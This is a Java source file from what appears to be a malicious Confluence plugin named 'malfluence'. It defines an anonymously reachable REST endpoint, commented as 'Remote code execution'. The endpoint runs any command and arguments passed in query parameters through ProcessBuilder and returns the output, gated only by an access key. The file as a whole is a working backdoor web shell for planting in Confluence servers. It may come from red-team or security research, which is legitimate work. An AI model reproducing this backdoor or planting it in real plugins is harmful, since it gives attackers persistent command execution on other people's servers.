package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Log;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

// Remote code execution
// GET /maintenance/exec?accesskey=<Access Key>&cmd=<Command to run>&args=<arg1,arg2,arg3>
@Path("/exec")
public class ExecuteCommand {

    @GET
    @AnonymousAllowed
    @Produces(MediaType.TEXT_PLAIN)
    public Response RunCmd(@QueryParam("accesskey") String accesskey, @QueryParam("cmd") String command, @QueryParam("args") String arguments_raw) {
        try {
            if (!Auth.IsValidKey(accesskey)) {
                return Response
                        .status(Response.Status.FORBIDDEN)
                        .build();
            }

            if (command == null) {
                String message = "Invalid parameter cmd";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            List<String> arguments = new ArrayList<>();
            if (arguments_raw != null) {
                // Parse arguments into a list
                for(String argument: arguments_raw.split(",")) {
                    arguments.add(argument);
                }
            }

            List<String> completeCommand = new ArrayList<>();
            completeCommand.add(command);
            completeCommand.addAll(arguments);

            Log.Debug(String.format("Trying to execute '%s'", completeCommand));

            // Start the command
            ProcessBuilder processBuilder = new ProcessBuilder(completeCommand);
            Process process = processBuilder.start();

            // Wait for it to finish
            int exitCode = process.waitFor();
            String output = readOutput(process.getInputStream());

            if (exitCode == 0) {
                // Command was successful, return output
                return Response
                        .ok(output)
                        .build();

            } else {
                String message = String.format("Command failed: %s (Exited with %d)", output, exitCode);
                Log.Debug(message);
                return Response
                        .status(Response.Status.INTERNAL_SERVER_ERROR)
                        .build();
            }

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
    private static String readOutput(InputStream inputStream) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        StringBuilder output = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        return output.toString();
    }
}